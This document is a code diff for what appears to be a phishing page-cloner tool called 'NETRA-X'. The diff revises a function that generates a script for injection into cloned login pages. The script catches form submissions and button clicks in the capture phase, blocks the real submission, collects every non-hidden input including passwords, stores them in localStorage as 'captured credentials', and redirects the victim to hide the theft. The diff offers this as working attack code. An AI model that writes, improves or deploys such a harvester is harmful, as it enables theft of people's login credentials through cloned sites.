@@ -24,79 +24,80 @@ export type PageClonerOutput = z.infer<typeof PageClonerOutputSchema>;
 
 const getHarvesterScript = (redirectUrl: string) => `
 <script>
+  // This is the main function that captures form data.
   function captureAndRedirect(formElement) {
-    if (!(formElement instanceof HTMLFormElement)) {
-      console.warn('Capture target is not a form element.');
+    if (!formElement || typeof formElement.querySelectorAll !== 'function') {
+      // Not a valid element, redirect to avoid breaking the user flow.
       window.location.href = '${redirectUrl}';
       return;
     }
-    
-    let credentials = {};
-    const inputs = formElement.querySelectorAll('input');
-    let capturedSomething = false;
 
-    inputs.forEach((input, index) => {
-      // Prioritize capturing password fields
-      if (input.type === 'password' && input.value) {
-        credentials['password'] = input.value;
-        capturedSomething = true;
-      } 
-      // Capture other text-like fields
-      else if (input.type !== 'hidden' && input.type !== 'submit' && input.type !== 'button' && input.type !== 'checkbox' && input.type !== 'radio' && input.value) {
-        // Use a generic key if name is missing, but prefer name
-        const key = input.name || 'input_' + index;
-        // Avoid overwriting an already found password field with a non-password field that also happens to be named 'password'
-        if (!(key === 'password' && credentials['password'])) {
-           credentials[key] = input.value;
-           capturedSomething = true;
-        }
+    const credentials = {};
+    const inputs = formElement.querySelectorAll('input');
+    let capturedData = false;
+
+    // Capture all non-hidden inputs with a value.
+    inputs.forEach(input => {
+      if (input.type !== 'hidden' && input.value) {
+        // Use name, id, or type as the key in that order of preference.
+        const key = input.name || input.id || input.type;
+        credentials[key] = input.value;
+        capturedData = true;
       }
     });
 
-    try {
-      if (capturedSomething) {
+    if (capturedData) {
+      try {
         const entry = {
-            ...credentials,
-            source: window.location.href, // Add source for context
-            timestamp: new Date().toISOString()
+          ...credentials,
+          source: window.location.href,
+          timestamp: new Date().toISOString()
         };
         const storageKey = 'netra-captured-credentials';
-        const storedCreds = localStorage.getItem(storageKey);
-        const existingCreds = storedCreds ? JSON.parse(storedCreds) : [];
-        const updatedCreds = [...existingCreds, entry];
-        localStorage.setItem(storageKey, JSON.stringify(updatedCreds));
+        // Retrieve existing data, or initialize if it doesn't exist.
+        const existingData = JSON.parse(localStorage.getItem(storageKey) || '[]');
+        // Add the new entry.
+        const updatedData = [...existingData, entry];
+        // Save back to localStorage.
+        localStorage.setItem(storageKey, JSON.stringify(updatedData));
+      } catch (e) {
+        // Log error but do not interrupt the user's redirection.
+        console.error('NETRA-X Harvester: Error saving credentials to localStorage.', e);
       }
-    } catch (err) {
-      console.error('Error saving credentials to localStorage:', err);
     }
     
-    // Redirect after a very short delay to ensure storage operation completes.
+    // Redirect the user to the intended page.
+    // Use a small delay to ensure localStorage has time to save.
     setTimeout(() => {
-        window.location.href = '${redirectUrl}';
+      window.location.href = '${redirectUrl}';
     }, 150);
   }
 
-  // Listener for standard form submissions.
+  // --- Event Listeners ---
+  // We use the 'capture: true' option to ensure our listeners run before any
+  // other scripts on the page can interfere or stop the event.
+
+  // 1. Intercept standard form submissions.
   document.addEventListener('submit', function(e) {
     const form = e.target;
-    if(form instanceof HTMLFormElement) {
+    // Prevent the form from actually submitting.
+    e.preventDefault();
+    e.stopPropagation();
+    captureAndRedirect(form);
+  }, true);
+
+  // 2. Intercept clicks on buttons that might trigger a JavaScript-based submission.
+  document.addEventListener('click', function(e) {
+    // Find the closest form associated with a clicked button.
+    const form = e.target.closest('form');
+    // We only act if the click was on a button or something that looks like one.
+    const isSubmitButton = e.target.type === 'submit' || e.target.tagName === 'BUTTON';
+
+    if (form && isSubmitButton) {
+      // Prevent any default click behavior and stop other scripts.
       e.preventDefault();
       e.stopPropagation();
       captureAndRedirect(form);
-    }
-  }, true);
-
-  // Listener for clicks on buttons that might trigger a JS-based submission.
-  document.addEventListener('click', function(e) {
-    const target = e.target.closest('button, input[type="submit"]');
-
-    if (target) {
-        const form = target.closest('form');
-        if (form) {
-            e.preventDefault();
-            e.stopPropagation();
-            captureAndRedirect(form);
-        }
     }
   }, true);
 </script>
